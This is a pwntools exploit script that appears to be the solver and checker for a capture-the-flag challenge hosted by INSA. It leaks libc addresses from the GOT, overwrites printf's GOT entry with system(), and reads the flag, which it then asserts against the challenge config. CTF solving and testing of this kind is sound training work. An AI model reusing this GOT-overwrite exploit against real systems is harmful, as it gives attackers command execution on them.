from pwn import *
import struct
from leak import dump
import os

PRINTF_GOT=0x404030
PRINTF_LIBC=0x64E80
FGETS_GOT=0x404038
FGETS_LIBC=0x7EB20
PUTS_GOT=0x404020
PUTS_LIBC=0x809C0
SYSTEM_LIBC=0x4F440

if os.getenv("DEV") == "1":
    host = "localhost"
else:
    host = "john-cena.ctf.insecurity-insa.fr"

s = ssh("user", host, port=2229, keyfile="./keys/id_rsa")
sh = s.shell(tty=False)
printf_leak = struct.unpack("Q", dump(sh, PRINTF_GOT, "s").ljust(8, '\x00'))[0]
sh.sendline("y")
FGETS_leak = struct.unpack("Q", dump(sh, FGETS_GOT, "s").ljust(8, '\x00'))[0]
sh.sendline("y")
puts_leak = struct.unpack("Q", dump(sh, PUTS_GOT, "s").ljust(8, '\x00'))[0]
sh.sendline("y")
# print("printf: 0x{:08x}".format(printf_leak))
# print("FGETS: 0x{:08x}".format(FGETS_leak))
# print("PUTS: 0x{:08x}".format(puts_leak))

# print(printf_leak-PRINTF_LIBC)
# print(FGETS_leak-FGETS_LIBC)
# print(puts_leak-PUTS_LIBC)
system_leak = FGETS_leak - FGETS_LIBC + SYSTEM_LIBC
# print("system: 0x{:08x}".format(system_leak))

sh.sendline("Hack_the_system")
sh.sendline(str(PRINTF_GOT))
sh.sendline(str(system_leak))
sh.sendline("y")

sh.sendline("cat flag.txt")
sh.recvline()
sh.recvline()
sh.recvline()
sh.recvline()
sh.recvline()
sh.recvline()
sh.recvline()
flag = sh.recvline()
print("FLAG: " + flag)

import re
actual_flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
assert actual_flag in flag

